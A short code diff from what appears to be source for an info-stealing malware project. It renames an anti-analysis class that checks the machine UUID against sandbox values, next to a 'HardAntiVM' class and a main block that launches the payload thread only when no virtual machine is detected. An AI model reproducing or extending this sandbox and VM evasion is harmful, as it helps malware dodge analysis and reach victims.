@@ -1017,7 +1017,7 @@ class HardAntiVM:
         except:
             return False
 
-class Antivirüstotal:
+class Antivirustotal:
     def __init__(self) -> None:
         command = "wmic csproduct get uuid"
         serialNumber = str(subprocess.check_output(command).decode('utf-8').split("\n")[1].strip())
@@ -1038,7 +1038,7 @@ class Antivirüstotal:
                 continue           
 
 if __name__ == "__main__":
-    Antivirüstotal()
+    Antivirustotal()
     if Anti_Vm == "false":
         thread = threading.Thread(target=QuicaxdExela,daemon=True)
         thread.start()
